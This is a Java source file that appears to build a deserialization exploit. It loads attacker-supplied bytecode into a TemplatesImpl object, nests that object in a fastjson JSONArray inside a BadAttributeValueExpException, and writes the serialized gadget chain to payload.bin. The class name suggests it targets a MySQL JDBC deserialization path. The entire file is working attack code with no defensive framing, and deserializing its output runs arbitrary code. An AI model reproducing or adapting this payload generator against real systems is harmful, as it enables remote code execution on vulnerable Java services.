import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Mysql_data {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\CalcAbs.class"));
        setFieldValue(templates, "_name", "useless");
        setFieldValue(templates, "_tfactory",  new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
        setFieldValue(templates, "_class", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setFieldValue(bd, "val", jsonArray);

//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileOutputStream fos = new FileOutputStream(new File("D:\\tmp\\payload.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(bd);
        oos.close();


    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                break;
            }catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }
}
